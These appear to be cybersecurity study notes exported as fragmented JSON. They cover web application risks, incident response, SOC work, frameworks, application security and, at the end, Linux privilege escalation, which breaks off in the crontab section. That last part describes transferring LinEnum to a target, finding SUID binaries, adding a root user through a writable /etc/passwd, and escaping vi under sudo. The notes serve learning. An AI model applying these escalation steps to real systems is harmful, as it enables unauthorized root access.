A web application is like a 'program' that we can use without installation as long we have a modern web browser, such as Firefox, Safari, or Chrome. Here are some examples of web applications:\n\n- Web mail such as Tutanota, Protonmail, Outlook, and Gmail.\n- Online office suites such as Microsoft Office 365 (Word, Excel, and PowerPoint), Google Drive (Docs, Sheets, and Slides), and Zoho Office (Writer, Sheet, and Show).\n- Online shopping such as Amazon.com, AliExpress, and Etsy.\n- Other examples include online banking, money transfer, weather forecast, and social media.\n\nThe idea of a web application is a program that is running on a remote server.\n\n- A server refers to a computer system running continuously to 'serve' the clients.\n\nConsider an online shopping applications that includes information about products, customers, and invoices. A database is used to store information in an organized way. A database server is responsible for many functions, including reading, searching, and writing to the database.\n\n- Products database: Contains details about the products, such as name, images, specifications, and price.\n- Customers database: Contains all details related to customers, such as name, address, email, and phone number.\n- Sales database: Expect to see what each customer has purchased and how they paid.\n\n![shop](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/9efb37af45d16b776ec3d6c6b9235c15.png)\n\nDisplays how a search for an item on an online shopping site works.\n\n1. The user enters an item name or related keywords in the search field. The web browser sends the search keyword(s) to the online shopping web application.\n2. The web applications queries (searches) the products database for submitted keywords.\n3. The product database returns the search results matching the provided keywords to the web application.\n4. The web application formats the results as a friendly web page and returns them to the user.\n\n![user_perspective](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/7cd9405026eca43ed73206e6e10e6b4c.png)\n\nThe user's perspective will only see an elegant online shop where all the technical infrastructure is hidden.\n\n\nMany companies offer bug bounty programs.

Log in at the website: The attacker can try to discover the password. The attacker would use a long list of passwords with an automated tool to test them against the login page.\n2. Search for the product: The attacker can attempt to breach the system by adding specific characters and codes to the search term and return data it should not.\n3. Provide payment details: The attacker would check if the payment details are sent in cleartext or using weak encryption. Encryption refers to making the data unreadable without knowing the secret key or password.\n\n### Identification and Authentication Failure\n\n- Allow the attacker to use brute force methods, i.e., try many passwords, usually using automated tools, to find valid login credentials.\n- Allow user's to choose a weak password.\n- Storing the users' passwords in plain text.\n\n### Broken Access Control\n\nAccess control ensures that each user can only access files (documents, images, etc.) related to their role or work.\n\n- Failing to apply the principle of the least privilege and giving users more access permissions than they need.\n  - An online customer should be able to view prices of the items, but they should not be able to change them.\n- Able to view or modify someone's account by using its unique identifier.\n  - Do not want a bank client to be able to view the transactions of another client.\n- Able to browse pages that require authentication (logging in) as an unauthenticated user.\n\n### Injection\n\nA vulnerability in the web application where the user can insert malicious code as part of their input.\n\n- Lack of proper validation and sanitization of the user's input.\n\n### Cryptographic Failures\n\nCryptography focuses on the processes of encryption and decryption of data. Encryption scrambles cleartext into cipher text, which should be gibberish to anyone who does not have the secret key to decrypt it. Encryption ensures that no one can read the data without knowing the secret key - Decryption converts the cipher text back into the original cleartext using the secret key.\n\n- Sending sensitive data in clear text through HTTP instead of HTTPS.\n- Relying on weak cryptographic algorithm.\n- Using default or weak keys for cryptographic functions.\n\n","n":0.038}}},{"i":4,"$":{"0":{"v":"Response","n":1},"1":{"v":"\n# Access Management and Incident Response\n\n- [ ] Describe the access management and incident response processes.\n- [ ] Describe the management process of Incident Response, how it is implemented, and why it is important to an overall security schema.\n\n- [ ] Describe the key concepts of Incident Response:\n  - [ ] E-Discovery\n  - [ ] Use of automated systems\n  - [ ] Business Continuity Planning and Disaster Recovery\n  - [ ] Post-incident activities\n\n- [ ] Describe the cyber security incident response processes and the 3 phases of Prepare, Respond and Follow up.\n\n---\n\n## Access Management\n\nAuthorization is the process of allowing somebody to access a specific object.\n\n- Access criteria\n  - Groups\n  - Time frame and specific dates\n  - Physical location\n  - Transaction type\n\n- \"Need to know\" only access information needed for the role.\n- Single Sign-on (SSO)\n\n### Authentication Concepts\n\n- Identity proof\n- Kerberos (SSO)\n- Mutual authentication\n  - MS-CHAP V2\n- SID's vs DACL's\n  - Security ID (Active Directory)\n  - Discretionary Access Control List\n\n---\n\n## Incident Response\n\nA breach of security is known as an incident. Despite all threat models and secure system designs, incidents do happen. Actions taken to resolve and remediate the threat are known as Incident Response (IR) and are a whole career path in cybersecurity.\n\nIncidents are classified using a rating of urgency and impact. Urgency will be determined by the type of attack, where the impact will be determined by the affected system and what impact that has on business operations.\n\n![urgency-impact](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/ab0cc8478b0bce9a400187f559d36dd6.png)\n\nAn incident is responded to by a Computer Security Incident Response Team (CSIRT), which is a group of employees with technical knowledge about the systems and/or current incident.\n\nIncident Management\n: Computer security incident management involves the monitoring and detection of security events on a computer or a computer network and the execution of proper resources to those events. Means the information security or the incident management team will regularly check and monitor the security events occurring on a computer or in our network.\n\n### Key Components\n\nEvents\n: An observed change to the normal behavior of a system, environment, process, workflow, or person. Examples: router, ACLs were updated, firewall policy was pushed.\n\nIncident\n:  An event that negatively effects the confidentiality, integrity, and/or availability (CIA) at an organization in a way that impacts the business.\n\nResponse team - Computer Security Incident Response Team\n: A team that receives reports of security breaches, conducts analyses of the reports and responds to the senders. A CSIRT may be an established group or an ad hoc assembly.\n\nInvestigation\n: The investigation seeks to determine the circumstances of the incident. Every incident will warrant or require an investigation. Collect evidence and keep in mind the chain of custody.\n\n### Key Concepts\n\nE-Discovery\n: Data inventory helps to understand the current tech status, data classification, data management, use automated systems. Understand how to control data retention and backup.\n\nAutomated Systems\n: Using SIEM, SOA, UBA, big data analysis, honeypots/honey-tokens, artificial intelligence or other technologies could enhance the mechanism to detect and control incidents that could compromise the tech environment.\n\nBCP (Business Continuity Plan) & Disaster Recovery\n: Understand the company in order to prepare the BCP. A BIA (Business Impact Analysis) is also good to have a clear understanding of the critical business areas. Also indicate if a security incident will trigger the BCP or the disaster recovery.\n\nPost-Incident\n: Root-cause analysis, understand the difference between error, problem and isolated incident. Lessons learned and reports are key.\n\n### Incident Response Process\n\n#### 1. Prepare\n\nThe first phase about setting up appropriate procedures with the right tools before the occurrence of an incident.\n\n1. Conduct a criticality assessment for the organization.\n2. Carry out a cyber security threat analysis, supported by realistic scenarios.\n3. Consider the implications of people, process, technology and information.\n4. Create an appropriate control framework.\n5. Review your state of readiness in cyber security incident response.\n\n#### 2. Respond\n\nIdentification of the actual incident to look at the affected areas of the network or the system.\n\n1. Identify cyber security incident.\n2. Define objectives and investigate situation.\n3. Take appropriate action.\n4. Recover systems, data, and connectivity.\n\n#### 3. Follow Up\n\n1. Investigate incident more thoroughly.\n2. Report incident to relevant stakeholders.\n3. Carry out a post incident review.\n4. Communicate and build on lessons learned.\n5. Update key information, controls and processes.\n6. Perform trend analysis.\n\n![[incident-response]]\n","n":0.038}}},{"i":5,"$":{"0":{"v":"Operations","n":1},"1":{"v":"\n# Security Operations Center (SOC)\n\nA security operation center is a team of IT security professionals monitoring a company's network and systems 24 hours a day, seven days a week.\n\n- **Find vulnerabilities on the network**: A vulnerability is a weakness that an attacker can exploit to carry out things beyond their permission level. \n  - The SOC might discover a set of MS Windows computers that must be patched against a specific published vulnerability.\n  - Vulnerabilities are not necessarily the SOC’s responsibility; however, unfixed vulnerabilities affect the security level of the entire company.\n- **Detect unauthorized activity**: It is crucial to detect any unauthorized activity quickly before it causes any damage.\n- **Discover policy violations**: A security policy is a set of rules and procedures created to help protect a company against security threats and ensure compliance.\n  - What is considered a violation would vary from one company to another; example include downloading pirated media files and sending confidential company files insecurely.\n- Detect intrusions: Intrusions refer to system and network intrusions.\n- **Support with the incident response**: An incident can be an observation, a policy violation, an intrusion attempt, or something more damaging such as a major breach.\n  - Responding correctly to a severe incident is not an easy task. The SOC can support the incident response team handle the situation.\n\n## Elements of Security Operations\n\n- Example data sources that the SOC relies on.\n- The services that the SOC provides.\n- An example scenario.\n\n### Data Sources\n\nThe SOC uses many data sources to monitor the network for signs of intrusions and to detect any malicious behavior.\n\n- **Server logs**: There are many types of servers on a network, such as a mail server, web server, and domain controller on MS Windows networks.\n  - Logs can contain information about various activities such as successful and failed login attempts, and more.\n- **DNS activity**: DNS stands for Domain Name System, and it is the protocol responsible for converting a domain name to an IP address.\n  - The SOC can gather information about domain names that internal systems are trying to communicate with by inspecting DNS queries.\n- **Firewall logs**: A firewall is a device that controls network packets entering and leaving the network by letting them through or blocking them.\n- **DHCP logs**: DHCP stands for Dynamic Host Configuration Protocol, and it is responsible for assigning an IP address to the systems that try to connect to a network.\n  - Inspecting DHCP transactions can learn about the devices that joined the network.\n\n### SOC Services\n\nServices include reactive and proactive services in addition to other services.\n\nReactive services refer to tasks initiated after detecting an intrusion or a malicious event.\n\n- **Monitor security posture**: The primary role of the SOC, and it includes monitoring the network and computers for security alerts and notifications and responding to them.\n- **Vulnerability management**: Refers to finding vulnerabilities in the company systems and patching (fixing) them. The SOC can assist but not necessarily execute them.\n- **Malware analysis**: The SOC might recover malicious programs that reached the network.\n  - Can do basic analysis by executing it in a controlled environment.\n- **Intrusion detection**: An IDS is used to detect and log intrusions and suspicious packets. The SOC's job is to main such a system, monitor its alerts, and go through its logs as the need dictates.\n\nProactive services refer to tasks handled by the SOC without any indicator of an intrusion.\n\n- **Network security monitoring (NSM):** Focuses on monitoring the network data and analyzing the traffic to detect signs of intrusions.\n- **Threat hunting**: The SOC assumes an intrusions has already taken place and begins its hunt to see if they can confirm this assumption.\n- **Threat Intelligence**: Focuses on learning about potential adversaries and their tactics and techniques to improve the company's defenses.\n\nOther services include cyber security training. Many data breaches and intrusions can be avoided by raising users' security awareness.\n\n### Example Scenario\n\nOne role in a SOC is the SOC analyst. A SOC analyst is responsible for network security monitoring and log management.\n\n- Notices a particular DNS query repeating every minute - a behavior unusual for normal user browsing the internet.\n  - Discover a process (program) using DNS to communicate with a malicious server.\n  - Found out the computer was infected after visiting a malicious website by reviewing the computer logs.\n  - The laptop is cleaned, and threat hunting starts to ensure that no other computers are infected.\n\n### [[More information about SOC and SIEM|SIEM#SIEM]]","n":0.037}}},{"i":6,"$":{"0":{"v":"Network","n":1},"1":{"v":"\n# Network Security Introduction\n\nA computer network is a group of computers and devices connected with each other. Network security focuses on protecting the security of these devices and the links connecting them.\n\nNetwork security consists of different hardware and software solutions to achieve the set of security goals. Hardware solutions refer to the devices you set up on a network to protect network security. Examples of hardware appliances:\n\n- Firewall appliance: The firewall allows and blocks connections based on a predefined set of rules.\n- Intrusion Detection System (IDS): Detects system and network intrusions and intrusion attempts to break into the network.\n- Virtual Private Network (VPN): Ensures that the network traffic cannot be read nor altered by a third party. It protects the confidentiality (secrecy) and integrity of the sent data.\n\nOn the other hand, we have software security solutions:\n\n- Antivirus software: Install on your computer or smartphone to detect malicious files and block them from executing.\n- Host firewall: A program that ships as part of the operating system, or a program installed on the system.\n  - MS Windows includes Windows Defender Firewall.\n  - Apple macOS includes an application firewall.\n\nAccording to the [Cost of a Data Breach Report 2021 by IBM Security](https://newsroom.ibm.com/2021-07-28-IBM-Report-Cost-of-a-Data-Breach-Hits-Record-High-During-Pandemic), a data breach in 2021 cost a company $4.24 million per incident on average, in comparison with $3.86 million in 2020. The average cost changes with the sector and the country. For example, the average total cost for a data breach was $9.23 million for the healthcare sector, while $3.79 million for the education sector.\n\n## Methodology of Attack\n\nEvery 'operation' requires some form of planning to achieve success against a target.\n\nAccording to Lockheed Martin, the Cyber Kill Chain has 7 steps:\n\n![kill-chain](https://www.lockheedmartin.com/content/dam/lockheed-martin/rms/photo/cyber/THE-CYBER-KILL-CHAIN-body.png.pc-adaptive.1920.medium.png)\n\n1. Recon: Short for reconnaissance, refers to where the attacker tries to learn as much as possible about the target. Information such as the types of servers, operating system, IP addresses, name of users, and email addresses.\n2. Weaponization: Preparing a file with a malicious component, for example, to provide the attacker with remote access.\n3. Delivery: Delivering the 'weaponized' file to the target via any method, such as email or USB flash memory.\n4. Exploitation: When the user opens the malicious file, their system executes the malicious component.\n5. Installation: The previous step should install the malware on the target system.\n6. Command & Control (C2): The successful installation of the malware provides the attacker with a command and control ability over the target system.\n7. Actions on Objectives: After gaining control over the target system, the attacker has achieved their objectives (stealing data).\n\n","n":0.049}}},{"i":7,"$":{"0":{"v":"Frameworks Pentest","n":0.707},"1":{"v":"\n# Frameworks and Their Purpose\n\n- [ ] Describe various cybersecurity frameworks and best practices, including NIST and the other the supporting organizations for each.\n- [ ] Describe the purpose of frameworks, baselines and best practices in an effective cybersecurity strategy.\n  \n- [ ] Describe what is meant by an IT governance process, what components are involved and why it is important.\n\n- [ ] Describe which compliance policies most organizations are required to follow.\n- [ ] Describe the use of audits in cybersecurity compliance.\n\n- [ ] Describe a penetration testing process, Mile 2 CPTE training, and what is meant by ethical hacking.\n\n- [ ] Describe the OWASP Top 10 tests, when and why they are used and where to get help from outside organizations.\n\n---\n\nBest practices for security standards, baselines and frameworks:\n\n- Used to improve the controls, methodologies and governance for the IT departments or the global behavior of the organization.\n- Seeks to improve performance, controls and metrics.\n- Helps to translate the business needs into technical or operational needs.\n\nNormative and compliance:\n\n- Rules to follow for a specific industry.\n- Enforcement for the government, industry, or clients.\n- Event if the company or the organization do not want to implement those controls, for compliance.\n\n## IT Governance Process\n\n- **Strategic and Tactic plans** - Each organization must have a set of strategic plans based on the goals objectives.\n- **Policies** - Those plans are tactical and strategic enforced by policies.\n- **Procedures** - Each policy may have a procedure associated with details regarding the operative process.\n- **Others** - Could be other documents such as guidelines, baselines, standards and technical procedures.\n\nIT Governance\n: Defined processes that ensure the effective and efficient use of IT in enabling an organization to achieve its goals.\n\n---\n\n## Cybersecurity Compliance and Audit Overview\n\n### Compliance and Normative\n\n- **SOX - The Sarbanes-Oxley** Act implemented standards to improve financial transparency and protect shareholders and general public from accounting errors and fraud.\n- **HIPAA - Health Insurance Portability and Accountability Act** is a series of regulatory standards that outline the lawful use and disclosure of protected health information.\n- **GLBA** - Known as the Financial Modernization Act of 1999 that requires financial institutions to explain how they share and protect their customers' private information.\n- **PCI/DDS** - Payment Card Industry Data Security Standard compliance revolves around information protection, data reduction, and security.\n\n### Audits\n\n1.

Different techniques are used to surface such security vulnerabilities at different stages of an applications lifecycle such as design, development, upgrade, and maintenance.\n\n### Network Security vs Application Security\n\nNetwork security is the protection of systems and information assets at the network level involving areas such as routers / switches, servers, workstations, and wireless networks.\n\nApplication security is the protection of application front ends, source code, and information assets at the software level involving systems such as website, databases, mobile apps, and client and server applications.\n\n- Both network security and application security are components of an overall information security program that includes policy procedures, incident response, and disaster recovery.\n\n## Software Development Lifecycle\n\n1. Plan\n2. Develop\n3. Tests\n4. Deploy\n5. Maintain\n\nCommon software development methodologies:\n\nWaterfall\n: Top-down approach is a simple and easy to follow, but not very flexible and design flaws can be costly if discovered after the application is deployed.\n\nAgile and Scrum\n: Consists of short bursts of analysis, design, coding, and testing. Allows team to be responsive and motivates the team to be productive.\n\n- However, due to cycle deadlines, it is easy to forget about application security testing.\n\nSpiral\n: Focuses on minimizing risk, which makes it possible to evaluate security at the end of each cycle. However, not as quick as Agile, and may increase the cost of the software development.\n\nIterative\n: Breaks up development into smaller prototypes through repeated cycles, which allows lessons to be learned from earlier iterations.\n\n### White Box Testing\n\nProvides the attackers with detailed information about the system to target.\n\n- Bypasses many reconnaissance steps normally precedes attacks, shortening the time of the attack, and increasing the likelihood that it will find security flaws.\n- Process usually done by a software developer who knows programming and application logic. Will be testing internal components of the applications of the application or piece of software, ensuring that specific functions work correctly and within a reasonable time.\n- Tester will have **full** knowledge of the application and its expected behavior and more time consuming than black-box testing.\n\n### Black Box Testing\n\nDoes not provide attackers with any information prior to the attack.\n\n- Simulates an external attacker trying to gain access to information about the business and technical environment before engaging in an attack.\n- The tester acts as a regular user testing the functionality and interaction of the application or piece of software.\n- Significantly increases the amount of time spent during the information gathering and enumeration phase to understand the attack surface of the target.\n\n### Gray Box Testing\n\nKnown as partial knowledge tests, are sometimes chosen to balance the advantages and disadvantages of white and black box penetration tests.\n\n- The most popular testing process for things such as penetration testing.\n- A combination of both black-box and white-box testing.\n- The tester will have some limited knowledge of the internal components of the application or piece of software.\n- Limited knowledge saves times, and is often chosen for extremely-well-hardened attack surfaces.\n\n### Source Code Analysis Tools\n\nStatic Application Security Testing (SAST)\n: Analyzes source code for security vulnerabilities prior to the launch of an application and is used to strengthen code.\n\n- Produces fewer false positives, but more implementations require access to the application source code and requires expert configurations and lots of processing power.\n\nDynamic Application Security Testing (DAST)\n: Find visible vulnerabilities by feeding the URL into an automated scanner. This method is highly scalable, easily integrated, and quick.\n\n- Requires expert configuration.\n- High possibility of false positives and negatives.\n\n\nInteractive Application Security Testing (IAST)\n: A solution that assesses applications from within using software instrumentation. This technique allows us to combine the strengths of both SAST and DAST methods as well as providing access to code, HTTP traffic, library information, back-end connections, and configuration information.\n\n## Application Security Threats and Attacks\n\nBefore an organization selects any third-part software, an application security professional should assess the risk and ask questions about the security standards used to develop the software.\n\n### Third Party Software and Supplier Risk Assessment\n\nThird party software standards, patching, and testing.\n\n- Identify how any risks would impact your organizations business.\n  - Financial\n  - Operational\n  - Strategic\n- Next step would be to determine the likelihood the risk would interrupt the business.\n- Finally, there is a need to identify how the risk would impact the business.\n\n#### Web Application Firewall (WAF)\n\nA web application firewall filters, monitors, and blacks HTTP traffic to and and from a web application.\n\n- WAF is able to filter the content of specific web applications while regular firewall serve as a safety gate between servers.\n- By inspecting HTTP traffic, it can prevent attack stemming from web application security flaws such as SQL injection, cross-site scripting, viral inclusion, and security misconfigurations.\n\n### Input Validation\n\n- Buffer overflow\n- Cross-site scripting\n- SQL injection\n- Canonicalization - The process of converting data that involves more than one representation into a standard approved format.\n\n### Authentication\n\n- Network eavesdropping\n- Brute force attack\n- Dictionary attacks\n- Cookie replay\n- Credential theft\n\n### Authorization\n\n- Elevation of privilege\n- Disclosure of confidential data\n- Data tampering\n- Luring attacks\n\n### Configuration Management\n\n- Unauthorized access to administration interfaces\n- Unauthorized access to configuration stores\n- Retrieval of clear text configuration data\n- Lack of individual accountability; over-privileged process and service accounts.\n\n\n### Exception Management\n\n- Information disclosure\n- Denial of service\n\n\n### Auditing and Logging\n\n- User denies performing an operation\n- Attacker exploits an application without trace\n- Attacker covers his or her tracks\n\n### OWASP Top 10 Web Application Security Risks\n\nTop 10 is a standard awareness document for developers and web application security. It Represents a broad consensus about the most critical security risk to web applications.\n\n1. **Injection** - When untrusted data is sent to an interpreter as part of a command or query to trick interpreter into executing unintended commands.\n2. **Broken Authentication** - Application related to authentication and session management issues allowing the attackers to compromise passwords, keys, or session tokens to exploit other users identities temporarily or permanently.\n3. **Sensitive Data Exposure** - Attackers may steal or modify protected data to conduct credit card fraud, identity theft, or other crimes.\n4. **XML External Entities (XXE)** - Poorly configured XML processors evaluate external entity references within XML documents.\n5. **Broken Access Control** - Restrictions on what authenticated users are allowed to are often not properly enforced.\n6. **Security Misconfigurations** - Most common seen issue result of insecure default configurations, incomplete, or Ad-hoc configurations.\n7. **Cross-site Scripting XSS** - Occurs whenever an application includes untrusted data in a new webpage without proper validation or updates an existing webpage with users data using a browser API that can create HTML or Javascript.\n   - Allows hackers to execute scripts in the victim's browser to hijack sessions, deface websites, or redirect the user to malicious sites.\n8. **Insecure De-serialization** - Leads to remote code execution. Can be used to perform attacks including replay attacks, injection attacks, and privilege escalation attacks.\n9. **Using components with known vulnerabilities** - A vulnerable component can be exploited for serious data loss or server takeover.\n10. **Insufficient Logging & Monitoring** - Missing or ineffective integration with incident response allows attackers to further attack systems, maintain persistence, pivot to more systems, extract or destroy data.\n    - Most breach studies show time to detect a breach is over 200 days, typically detected by external parties rater than internal processes or monitoring.\n\n## Application Security Standards and Regulations\n\n### Threat Modeling\n\nThreat Modeling\n: A process by which potential threats, such as structural vulnerabilities or the absence of appropriate safeguards, can be identified, enumerated, and mitigation can be prioritized.\n\n- The purpose of threat modeling is to provide defenders with a systematic analysis of what controls or defenses need to be included, given the nature of the system, the probable attacker's profile, the most likely attack vectors, and the assets most desired by an attacker.\n\nThe threat modelling process is very similar to a risk assessment made in workplaces for employees and customers. The principles all return to:\n\n- Preparation\n- Identification\n- Mitigation\n- Review\n\nHowever, a complex process needs constant review and discussion with a dedicated team. An effective threat model includes:\n\n- Threat intelligence\n- Asset identification\n- Mitigation capabilities\n- Risk assessment\n\nTo help with this, there are frameworks:\n\n- **STRIDE(Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, and Elevation of privileges) methodology** - Introduced in 1999 at Microsoft for developers to find threats in products.\n  - _Spoofing_: Requires to authenticate requests and users accessing a system. Spoofing involves a malicious party falsely identifying itself as another.\n    - Access keys (such as API keys) or signatures via encryption helps remediate this threat.\n  - _Tampering_: Help provide integrity to the data. Data that is accessed must be kept integral and accurate.\n  - _Repudiation_: Dictates the use of services such as logging of activity for a system or application to track.\n  - _Information Disclosure:_ Applications or services that handle information of multiple users need to be appropriately configured to only show information relevant to the owner is shown.\n  - **Denial of Service**: Applications and services use up system resources, and measures in place so that the abuse of application/service won't result in down time.\n  - **Elevation of Privileges**: The worst-case scenario for an application or service. It means that a user who was able to escalate their authorization to that of a higher level of an administrator. This often leads to further exploitation or information disclosure.\n- **P.A.S.T.A** - Stands for process for attack simulation and threat analysis, which is a 7-step methodology.\n- **TRIKE** - Using threat models as a risk management tool to satisfy the security auditing process, threat models are based on requirements model.\n  - Establish the stakeholder defined acceptable level of risk assigned to each asset class.\n  - Analysis of the requirements model yields a threat model for which threats are enumerated and assigned risk values.\n- **VAST** - Visual agile and simple threat modeling and necessity of scaling the threat modeling process across the infrastructure and entire SDLC into Agile software development.\n\n![[security.response#Incident-Response]]\n\n### Standards\n\n#### CERT Secure Coding\n\n- Computer Emergency Response Team or CERT, for the software engineering Institute is a non-profit United States federally funded research and development center.\n- Software coding standard for the C programming language, developed by the CERT Coordination Center.\n- Used to improve the safety, reliability, and security of software systems.\n\n#### Common Weakness Enumeration (CWE)\n\n- Software weaknesses and vulnerabilities.\n- Sustained by a community project with the goals of understanding flaws in software.\n- Project is sponsored by the National Cybersecurity FFRDC (Federally Funded Research and Development Center).\n\n#### DISA-STIG - Defense Information Systems Agency\n\n- A security technical implementation guide as a cybersecurity methodology for standardizing security protocols within networks, servers, and computers, to enhance overall security.\n\n#### ISO 27034/24772\n\n- Another set of standards for application security are from the International Organization for Standardization. \n- ISO 27034 describes the minimum requirements for application security control.\n- ISO 24772 is a standard around information technology programming languages, which provides guidance to avoiding vulnerabilities and programming languages through language selection and use. \n\n#### PCI-DSS PCI Data Security Standard\n\n- Mandated by the card brands but administered by the Payment Card Industry Security Standards Council.\n- Increase controls around cardholder data to reduce credit card fraud.\n\n#### NIST 800-53\n\n- A special publication provides a catalog of security and privacy controls for all US federal information systems except those related to national security.\n- Published by the National Institute of Standards and Technology (non-regulator agency of the United States Department of Commerce).\n\n#### Gramm-Leach-Bliley Act (GLBA)\n\n- Known as Financial Services Modernization Act of 1999.\n- More strict governmental boundaries between financial institutions to limit companies share and provide information with each other.\n\n#### Health Insurance Portability and Accountability 1996 (HIPAA)\n\n- Created to modernize the flow of healthcare information.\n  - How personally identifiable information maintained by the healthcare and healthcare insurance industries could be protected from fraud and theft.\n  - Address limitations on healthcare insurance cover.\n\n#### Sarbanes-Oxley Act of 2002 (SOX)\n\n- A United States federal law that set new or expanded requirements for all US public company boards, management, and public accounting firms.\n  - Many provisions also applied to privately held companies, such as the willful destruction of evidence to impede a federal investigation.\n\n","n":0.022}}},{"i":10,"$":{"0":{"v":"Linux","n":1}}},{"i":11,"$":{"0":{"v":"Privilege Escalation","n":0.707},"1":{"v":"\n# What is Privilege Escalation?\n\nInvolves moving from a lower permission to a higher permission level. Technically, it is the exploitation of vulnerability, design flaw or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.\n\nRarely during CTF or real-world penetration test, will be able to gain initial access that affords administrator access. Privilege escalation allows to gain system administrator levels of access to:\n\n- Reset passwords\n- Bypass access controls to compromise protected data\n- Edit software configurations\n- Enable persistence to gain access to the machine later\n- Change privilege of users\n- And other administrator or super user commands...\n\n## Direction of Privilege Escalation\n\n![privilege tree](https://github.com/TheRealPoloMints/Blog/blob/master/Security%20Challenge%20Walkthroughs/Common%20Linux%20Privesc/Resources/tree.png?raw=true)\n\nThere are two main privilege escalation variants:\n\n### Horizontal Privilege Escalation\n\n- Expand reach over the compromised system by taking over a different user who is on the same privilege level.\n  - Hijack a normal user to inherit files and access the user has.\n  - Can be used to access another normal privilege user that haves their SUID file attached to their home directory which can then be used to get super user access (travel sideways on the tree).\n\n### Vertical Privilege Escalation\n\n- Attempt to gain higher privileges or access, with an existing account that is already compromised.\n- For local privilege escalation attacks, this might mean hijacking an account with administrator privileges or root privileges (travel up on the tree).\n\n## Enumeration with LinEnum\n\nLinEnum is a simple bash script that performs commands related to privilege escalation, saving time and allowing more effort to be put toward getting root.\n\n- Download a local copy of LinEnum from: https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh\n\n### How to get LinEnum on Target Machine\n\nThere are two ways to get LinEnum on the target machine.\n\n![server](https://github.com/TheRealPoloMints/Blog/blob/master/Security%20Challenge%20Walkthroughs/Common%20Linux%20Privesc/Resources/1.png?raw=true)\n\n1. Go to the directory where the local copy of LinEnum is stored in and start a Python web server using `python3 -m http.server 8000`. Then use `wget` on the target machine, and local IP, to grab the file from the local machine.\n\n![wget](https://github.com/TheRealPoloMints/Blog/blob/master/Security%20Challenge%20Walkthroughs/Common%20Linux%20Privesc/Resources/2.png?raw=true)\n\n2. Make the file executable using the command `chmod +x FILENAME.sh`.\n\nIf unable to transport the file, and if have sufficient permissions, copy the raw LinEnum code from the local machine and paste it into a new file on the target, using Vi or Nano. Then save the file with the .sh extension.\n\n- Finally make the file executable using the command `chmod +x FILENAME.sh` to have own executable copy of the LinEnum script on the target machine.\n\n### Running LinEnum\n\nLinEnum can be run similar to any bash script.\n\n- Go to the directory where LinEnum is located.\n- Run the command `./LinEnum.sh`.\n\n### Understanding LinEnum Output\n\nThe LinEnum output is broken down into different sections:\n\n- **Kernel information** is shown here to show a likely kernel exploit available for the machine.\n- **Can we read/write sensitive files**: Files that any authenticated user can read and write to. By looking at the permissions of these sensitive files, potentially find a misconfiguration that allows users who should not be able to, able to write to sensitive files.\n- **SUID Files**: SUID (Set owner User ID up on execution) is a special type of file permissions given to a file. It allows the file to run with permissions of whoever the owner is. If this is root, it runs with root permissions and allow us to escalate privileges.\n- **Crontab Contents**: The scheduled cron jobs are shown - used to schedule commands at a specific time.\n\n#### Abusing SUID/GUID Files\n\nThe first step in Linux privilege escalation exploitation is to check for files with the SUID/GUID bit set.\n\n- File or files can be run with the permissions of the file(s) owner/group.\n\n##### SUID Binary\n\nIn Linux, everything is a file, including directories and devices which have permission to allow restrict three operations (read/write/execute).\n\nHere is how maximum privileges (rwx-rwx-rwx) look:\n\n- r = read\n- w = write\n- x = execute\n\n| user | group | others |\n| ---- | ----- | ------ |\n| rwx  | rwx   | rwx    |\n| 421  | 421   | 421    |\n\nThe maximum number of bit that can be used to set permission for each user is 7, which is a combination of read (4) write (2) and execute (1) operation. For example, if you set permissions using \"chmod\" as 755, then it will be: rwxr-xr-x.\n\n- When a special permission is given to each user it becomes SUID or SGID. When extra bit '4' is set to user(Owner) it becomes SUID (Set User ID).\n  - '2' is set to group it becomes SGID(Set Group ID)\n- SUID: rws-rwx-rwx\n- GUID: rwx-rws-rwx\n\n###### Finding SUID Binaries\n\nTo find SUID capable files on the system: `find /-perm -u=s type f 2>/dev/null`\n\n- `find` - Initiates the 'find' command\n- `/` - Searches the whole file system\n- `-perm` - Searches for files with specific permissions\n- `-u=s` - Any of the permission bits mode are set for the file\n- `-type f` - Only search for files\n- `2>/dev/null` - Suppresses errors\n\n## Exploiting Writeable /etc/passwd\n\nContinue with enumeration, we discovered that user7 is a member of the root group with gid 0. From the LinEnum scan, we know the `/etc/passwd` file is writable for the user. We can conclude that user7 can edit the file.\n\n### Understanding /etc/passwd\n\nThe `/etc/passwd` file stores essential information, which is required during login - storing user account information.\n\n- File is a plain text file. It contains a list of the system's accounts, giving for each account useful information like user ID, group ID, home directory, shell and more.\n- Write access must only limit for the superuser/root account.\n\n### Understanding /etc/passwd Format\n\nThe file contains one entry per line for each user (user account) of the system. All fields are separated by a colon `:` symbol.\n\n- test:x:0:0:root:/root:/bin/bash\n\n1. **Username**: Used when user logs in. It should be between 1 and 32 characters in length.\n2. **Password**: An x character indicates that encrypted password is stored in /etc/shadow file. You need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in the file. In this case, the password hash is stored as an 'x'.\n3. **User ID (UID)**: Each user must be assigned a user ID (UID).\n   - UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. UID 100-999 are reserved by system for administrative and system accounts/groups.\n4. **Group ID (GID)**: The primary group ID (stored in /etc/group file)\n5. **User ID Info**: The comment field allows to add extra information about the users such as user's full name, phone number, etc.\n6. **Home directory**: The absolute path to the directory to the user will be in when they log in.\n7. **Command/shell**: The absolute path of a command or shell (/bin/bash).\n\n### How to Exploit a Writable /etc/passwd\n\nIf we have a writable /etc/passwd file, we can write a new line entry and create a new user.\n\n- Add the password hash of our choice, set the UID, GID and shell to root and allowing us to log in as our own root user!\n\n## Escaping\n\n**Sudo -l**\n\n- Every time have access to an account, always use `sudo -l` to list what commands are able to use as a super user account.\n\n**Escaping Vi**\n\n- Running this command as 'user8' account shows us that this user can run vi with root privileges. This will allow us to escape vim in order to escalate privileges and get a shell as the root user.\n\n**Misconfigured Binaries and GTFOBins**\n\n- A good place to look on how to exploit them is GTFOBins.\n- GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.\n- https://gtfobins.github.io/\n\n## Exploit Crontab\n\nThe Cron daemon is a long-running process that executes commands at specific dates and times.\n\n- Use to schedule activities, either as one-time events or as recurring tasks.\n- Can create a 